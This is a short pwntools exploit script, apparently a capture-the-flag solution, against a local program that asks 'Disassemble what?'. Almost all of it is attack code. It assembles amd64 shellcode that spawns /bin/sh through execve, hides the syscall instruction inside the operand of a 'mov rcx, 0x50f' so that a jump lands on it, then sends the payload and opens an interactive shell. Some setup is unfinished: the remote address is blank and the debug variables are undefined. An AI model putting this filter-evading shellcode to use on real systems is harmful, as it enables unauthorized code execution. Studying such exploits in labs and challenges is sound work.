from pwn import *

context.arch = "amd64"

if args.REMOTE:
  # fill in remote address
  p = remote()
elif args.REMOTE2:
  p = remote("localhost", 40003)
elif args.GDB:
  context.terminal = ["tmux", "splitw", "-h"]
  p = gdb.debug(binary, gdbscript=gs)
else:
  p = process("./vuln.pl")

# create exploit here

payload = asm("mov rdi, 0x68732f6e69622f; push rdi; mov rdi, rsp; xor rsi, rsi; xor rdx, rdx; mov eax, 0x30; mov ecx, 0xb; add rax, rcx; jmp $+5; mov rcx, 0x50f")

p.sendlineafter(b"Disassemble what?\n", payload)
p.interactive()